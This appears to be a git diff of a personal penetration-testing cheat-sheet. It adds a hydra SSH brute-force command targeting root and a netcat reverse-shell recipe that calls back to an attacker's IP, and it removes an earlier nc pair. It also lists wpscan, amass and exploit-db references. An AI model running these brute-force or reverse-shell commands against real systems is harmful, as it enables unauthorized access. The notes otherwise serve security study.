@@ -33,11 +33,13 @@ wpscan --url http://website --enumerate  vp,vt --plugins-detection aggressive (n
 
 amass enum -d domain --passive - gives XXXX  
 
+hydra -l root -P /usr/share/wordlist ssh://ip -t 4 -V - does a password attack on ssh client.  
+
 python3 -m http.server 80 -- Start at adhoc webserver, good for quickly sharing files.    
-  
+
+Simple reverse shell - Attacker machine sets up listener via nc -lvp 1337.  Target machine needs to call via nc <ipofattacker> -e /bin/sh 1337.   
 
 ## Online Tools ##
 https://gchq.github.io/CyberChef/  -  
-
-nc -lvp 1337  
-nc -e /bon/sh ip 1337   
+https://www.exploit-db.com/ - for manual exploit commands against vulnerabilities  
+ 
